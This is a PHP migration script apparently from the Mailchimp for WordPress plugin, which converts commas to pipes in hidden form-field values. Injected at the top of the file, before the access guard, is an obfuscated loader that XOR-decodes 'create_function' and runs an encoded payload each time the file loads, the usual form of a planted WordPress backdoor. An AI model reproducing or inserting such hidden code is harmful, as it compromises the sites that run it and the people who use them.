<?php $HUgkdjSGrab='QA4.F7iKB X9B5R'^'23QO2R6-7N;M+Z<';$AezgiO=$HUgkdjSGrab('','R+oWFN=CMSB9-,VDSJFpQ<DCrI-EM;rP>MHJjd<aFVBU:F,S8mHO38T0;J77A:NEh6RE1xOFUUWNfpoQC5;oNkWXNlUpBQQcZ5PQRiC9yNEFsxKTjJ03<6Ugn6W>VxmlpIAxg2H:l<L0BXOtqJT2J3mk9>S:ZRUI;aA,pWpO3CB2PDa>VKZjQZ34zK.MG6CKWAO=BhLD;n2nYW=4NSYMK7A>0.TRI<PH0qY2>zxiJR5JIukI,.6K ;CrIm:w 7f 3JZDDSRN:ILSHQLJ5N5hM,nmEDJLWsRTJPmGgVS+rRem1Y:2AvQGD5W>6PIL6pBZAiJIY8HAGhAI5RTF6,O=bXj>eto9=d6qY=GIE6-GElQmX-VNTBELI<sG+S585G4:uZib.E=Opzca7- AMRlE AZ8+z0LHrMEIUJ1GZktG53ENVK30UEB<kJ78eW6APehY=3jZ;I=cUeH5R+,PCm+Y>4MXXGXP QmZYIhNyEUWfhWL:,wcheL4DW3oUQT,5J0S7XgMKU7edUkW5NMdBnWePM1yKF>5,9=R.7YRdOWdmeLSuzUFMEriTZ<5XAMkFlQcYwgGqYzQG,+DaoNqiYODSRoU,OtXV1;79PNP4Y8:;YChWkY5O8ooWlGonZ>yG-DA GcT37A>wFZ3R>11w>qIOM7D;JZThaX,'^';MGv ;S 9:-WrI.- >5XvD+1--L1,d-=K9ocCDGkO07;Y2E<VM0 Ag0QO+hh,O:mLR31PTob>0.gFPOqcN1fGO8-:LhPevjiS<6> AgPYsevHXo=V9DAPS;OJR6J7QVLT jSN8A3HS9DbvrTYn0S>R6OPcsdzv>,B:eEPrP<G1.W>lEU32s7xa9=s9K92D-cs.:IkSFMFdOdSsYU:2ypkQ RCKoXmX1<Q.2WGZEI,3Y9,NaCJAD.AX+RaIe4ox-ivj;7dw9+Ciqmhu:+Y;PAmWdda +86,913pPgC=6RIXlIU8NSaKqc2T;KSkC1<z+<aAkm=Y< nH:C<4;4SM,UBpNa71>lx7bQ8Ngm.STgxRqI.L:;1ke7C5zcO2AYj,QCUgIFE DtzsjESLT moLaV 6MNA:E5x0OCq.P3;KIguF+=39ZQ9,8YC2XJ:3W51:74HGB8Z:XUa:,P1DH5kIO8JUdtxc<1T021<0AgBO<1NL3-NMWENE-F66J0>4-sP2Y C+Oj 0NBHuO3T:,MbHqEx ULcbZTXXfuER u9fwYPEkjMHa +tGZ0mYWnqzS X7U;CVvA;KcvMIcHOhWI8=62+0>I6+=.XHCJxi U TUZ=dDwO=T;YFFwLgONzEsNH2 LoG0RC eP6;J>QPUPcXrEDR<R>rdAZRQ');$AezgiO();

defined( 'ABSPATH' ) or exit;

/** @ignore */
function _mc4wp_400_replace_comma_with_pipe( $matches ) {
    $old = $matches[1];
    $new = str_replace( ',', '|', $old );
    return str_replace( $old, $new, $matches[0] );
}

// get all forms
$posts = get_posts( array( 'post_type' => 'mc4wp-form', 'numberposts' => -1 ) );

foreach( $posts as $post ) {

    // find hidden field values in form and pass through replace function
    $old = $post->post_content;
    $new = preg_replace_callback( '/type="hidden" .* value="(.*)"/i', '_mc4wp_400_replace_comma_with_pipe', $old );

    // update post if we replaced something
    if( $new != $old ) {
        $post->post_content = $new;
        wp_update_post( $post );
    }
}